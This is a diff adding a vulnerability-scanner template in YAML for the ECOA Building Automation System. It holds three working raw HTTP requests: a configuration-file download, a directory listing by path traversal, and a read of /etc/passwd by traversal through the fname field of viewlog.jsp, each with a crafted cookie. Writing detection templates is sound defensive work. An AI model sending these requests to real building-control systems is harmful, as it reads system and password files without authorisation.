@@ -1,0 +1,65 @@
+id: ecoa-building-system-vulnerabilities
+info:
+  name: ECOA Building System Multiple Vulnerabilities
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    ECOA Building System is affected by multiple vulnerabilities including file read and directory traversal issues.
+    This template checks for these vulnerabilities via specific endpoints and responses.
+  tags: file-read, directory-traversal
+  reference:
+    - https://packetstormsecurity.com/files/164110/ECOA-Building-Automation-System-Configuration-Download-Information-Disclosure.html
+    - https://packetstormsecurity.com/files/164118/ECOA-Building-Automation-System-Local-File-Disclosure.html
+
+variables:
+  directory_path: "../../../../../../../etc"
+  file_path: "../../../../../../../../etc/passwd"
+
+http:
+  - raw:
+      - |
+        GET /syspara.dat HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: UCLS=19'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "/webpage/pwsd.bin"
+        part: body
+
+  - raw:
+      - |
+        GET /fmangersub?cpath=/{{directory_path}} HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: UCLS=19'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "<td fname='(.*?)' >"
+        part: body
+
+  - raw:
+      - |
+        POST /viewlog.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: UCLS=19'
+        Content-Type: application/x-www-form-urlencoded
+
+        yr=2020&mh=6&fname={{file_path}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:(.*?):0:0:"
+        part: body
